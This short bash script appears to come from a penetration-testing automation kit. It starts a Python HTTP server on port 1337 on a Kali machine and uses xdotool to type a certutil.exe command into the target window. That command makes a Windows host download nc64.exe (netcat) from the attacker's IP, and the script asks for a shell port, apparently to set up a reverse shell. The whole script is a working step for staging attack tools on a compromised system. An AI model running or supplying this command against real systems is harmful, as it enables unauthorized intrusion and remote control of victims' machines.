#!/bin/bash

: '
cmd: upload nc64 file to server
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Shell port"

PORT=${form_data["Shell port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:1337/nc64.exe nc64.exe"
xdotool key Return
sleep 60

kill $HTTP_PID